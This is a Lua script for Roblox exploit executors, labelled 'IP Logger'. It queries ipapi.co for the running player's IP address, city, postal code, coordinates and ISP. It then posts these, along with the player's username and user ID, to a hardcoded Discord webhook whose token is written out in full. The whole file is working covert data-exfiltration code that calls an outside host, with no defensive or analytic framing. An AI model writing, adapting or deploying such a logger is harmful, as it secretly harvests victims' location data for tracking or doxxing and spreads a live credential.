local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1487398026015408200/wAe0nSED3chuqQ0RlNP8k2iNFqEiKYlfpaKWFlcRwXBVaSmreH1NT5jZq1JpF5DsJfM6"

local function GetIPData()
    local success, result = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("https://ipapi.co/json/"))
    end)
    
    if success then
        return result
    else
        return nil
    end
end

local function SendToWebhook(data)
    local LocalPlayer = Players.LocalPlayer
    
    local embed = {
        ["embeds"] = {{
            ["title"] = "🎯 New IP Captured",
            ["color"] = 16711680,
            ["fields"] = {
                {
                    ["name"] = "👤 Username",
                    ["value"] = LocalPlayer.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "🆔 User ID",
                    ["value"] = tostring(LocalPlayer.UserId),
                    ["inline"] = true
                },
                {
                    ["name"] = "🌐 IP Address",
                    ["value"] = data.ip or "Unknown",
                    ["inline"] = false
                },
                {
                    ["name"] = "📍 City",
                    ["value"] = data.city or "Unknown",
                    ["inline"] = true
                },
                {
                    ["name"] = "🗺️ Region",
                    ["value"] = data.region or "Unknown",
                    ["inline"] = true
                },
                {
                    ["name"] = "🏳️ Country",
                    ["value"] = (data.country_name or "Unknown") .. " " .. (data.country or ""),
                    ["inline"] = true
                },
                {
                    ["name"] = "📮 Postal Code",
                    ["value"] = data.postal or "Unknown",
                    ["inline"] = true
                },
                {
                    ["name"] = "🌍 Coordinates",
                    ["value"] = (data.latitude or "Unknown") .. ", " .. (data.longitude or "Unknown"),
                    ["inline"] = true
                },
                {
                    ["name"] = "🌐 Timezone",
                    ["value"] = data.timezone or "Unknown",
                    ["inline"] = true
                },
                {
                    ["name"] = "📡 ISP",
                    ["value"] = data.org or "Unknown",
                    ["inline"] = false
                },
                {
                    ["name"] = "📱 ASN",
                    ["value"] = data.asn or "Unknown",
                    ["inline"] = true
                },
                {
                    ["name"] = "⏰ Timestamp",
                    ["value"] = os.date("%Y-%m-%d %H:%M:%S"),
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "IP Logger"
            },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
        }}
    }
    
    local success, response = pcall(function()
        return request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(embed)
        })
    end)
    
    if not success then
        syn.request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(embed)
        })
    end
end

local ipData = GetIPData()
if ipData then
    SendToWebhook(ipData)
    print("Data sent")
else
    print("Failed to get IP data")
end
